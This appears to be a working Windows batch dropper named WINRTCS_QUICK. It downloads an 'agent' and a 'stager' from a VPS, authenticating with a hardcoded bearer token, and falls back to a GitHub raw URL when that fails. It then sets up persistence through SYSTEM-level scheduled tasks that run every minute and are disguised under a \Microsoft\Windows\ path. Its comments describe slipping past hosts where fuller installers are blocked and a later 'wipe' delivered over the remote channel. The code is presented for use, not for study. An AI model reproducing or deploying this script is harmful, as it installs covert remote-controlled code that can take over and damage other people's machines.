@echo off
rem WINRTCS_QUICK Q2 - minimal installer for hosts where the full bootstrap gets blocked.
rem No Defender/service/registry-tampering operations: download agent+stager, create tasks, run.
rem Once the agent is alive it self-updates, and the guard handles gryxa. Legacy wipe can follow
rem via payload once the channel is up.
rem Q2 (C23): dual-URL fetch (VPS primary + bearer, GitHub fallback) with curl --fail.
setlocal EnableExtensions EnableDelayedExpansion
set "ZD=C:\ProgramData\WinRTCS"
set "CURL=%SystemRoot%\System32\curl.exe"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "BASE2=https://debian.seczio.com/winrtcs"
set "TOK=fe7e8f3b8af479870248be10ca25410b8e1bf9a5"
if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
call :QFetch winrtcs_run.cmd "%ZD%\winrtcs_run.cmd"
call :QFetch winrtcs_agent.cmd "%ZD%\winrtcs_agent.cmd"
if not exist "%ZD%\winrtcs_agent.cmd" ( echo FAIL agent-download & endlocal & exit /b 1 )
findstr /C:"WINRTCS_AGENT" "%ZD%\winrtcs_agent.cmd" >nul 2>&1
if errorlevel 1 ( del /f /q "%ZD%\winrtcs_agent.cmd" >nul 2>&1 & echo FAIL agent-bad & endlocal & exit /b 2 )
findstr /C:"WINRTCS_RUN" "%ZD%\winrtcs_run.cmd" >nul 2>&1
if errorlevel 1 ( del /f /q "%ZD%\winrtcs_run.cmd" >nul 2>&1 & echo FAIL run-bad & endlocal & exit /b 3 )
set "ACT=cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_run.cmd"
schtasks /Create /TN "\Microsoft\Windows\WinRTCS\Agent" /TR "%ACT%" /SC MINUTE /MO 1 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\WinRTCS\Guard" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Run /TN "\Microsoft\Windows\WinRTCS\Agent" >nul 2>&1
echo WINRTCS_QUICK=OK
endlocal & exit /b 0

:QFetch
del /f /q "%~2" >nul 2>&1
"%CURL%" -f -L --ssl-no-revoke -H "Authorization: Bearer %TOK%" --connect-timeout 6 --max-time 30 -o "%~2" "%BASE2%/%~1?t=%RANDOM%%RANDOM%" >nul 2>&1
if exist "%~2" for %%F in ("%~2") do if %%~zF GTR 10 exit /b 0
"%CURL%" -f -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%~2" "%BASE%/%~1?t=%RANDOM%%RANDOM%" >nul 2>&1
exit /b 0
